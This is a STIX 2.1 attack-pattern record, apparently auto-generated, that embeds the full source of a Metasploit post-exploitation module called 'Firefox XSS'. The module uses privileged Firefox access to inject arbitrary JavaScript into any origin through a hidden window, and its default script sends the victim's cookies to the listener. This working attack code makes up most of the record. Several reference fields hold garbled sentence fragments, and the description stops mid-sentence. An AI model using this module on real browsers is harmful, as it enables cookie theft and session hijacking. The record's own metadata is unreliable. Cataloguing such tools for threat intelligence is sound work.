{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f57d7d9c-ef35-4473-821d-7fbcefc86deb",
    "created": "2024-08-14T16:33:13.574028Z",
    "modified": "2024-08-14T16:33:13.574032Z",
    "name": "Firefox XSS",
    "description": " This module runs the provided SCRIPT as javascript in the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/firefox/gather/xss.rb",
            "external_id": "xss.rb"
        },
        {
            "source_name": "ChromeWindowtotheURL",
            "external_id": "theninjectingtheSCRIPTwithFunction()."
        },
        {
            "source_name": "OptString.new(URL",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Payload::Firefox\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox XSS',\n        'Description' => %q{\n          This module runs the provided SCRIPT as javascript in the\n          origin of the provided URL. It works by navigating to a hidden\n          ChromeWindow to the URL, then injecting the SCRIPT with Function().\n          The callback \"send(result)\" is used to send data back to the listener.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'Platform' => [ 'firefox' ]\n      )\n    )\n\n    register_options([\n      OptString.new('SCRIPT', [true, 'The javascript command to run', 'send(document.cookie)']),\n      OptPath.new('SCRIPTFILE', [false, 'The javascript file to run']),\n      OptString.new('URL', [\n        true, 'URL to inject into', 'https://metasploit.com'\n      ]),\n      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])\n    ])\n  end\n\n  def run\n    results = js_exec(js_payload)\n    if results.present?\n      print_good results\n    else\n      print_error 'No response received'\n    end\n  end\n\n  def js_payload\n    js = datastore['SCRIPT'].strip\n    %|\n\n      (function(send){\n        #{set_timeout_source}\n\n        var hiddenWindow = Components.classes[\"@mozilla.org/appshell/appShellService;1\"]\n                               .getService(Components.interfaces.nsIAppShellService)\n                               .hiddenDOMWindow;\n\n        hiddenWindow.location = 'about:blank';\n        var src = (#{JSON.unparse({ src: js })}).src;\n        var key = \"#{Rex::Text.rand_text_alphanumeric(rand(8..19))}\";\n\n        hiddenWindow[key] = true;\n        hiddenWindow.location = \"#{datastore['URL']}\";\n\n        var evt = function() {\n          if (hiddenWindow[key]) {\n            setTimeout(evt, 200);\n          } else {\n            setTimeout(function(){\n              try {\n                send(hiddenWindow.wrappedJSObject.Function('send', src)(send));\n              } catch (e) {\n                send(\"Error: \"+e.message);\n              }\n            }, 500);\n          }\n        };\n\n        setTimeout(evt, 200);\n      })(this.send);\n\n    |.strip\n  end\nend\n",
    "x_mitre_contributors": [
        "[ joev ]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'firefox' ]"
    ]
}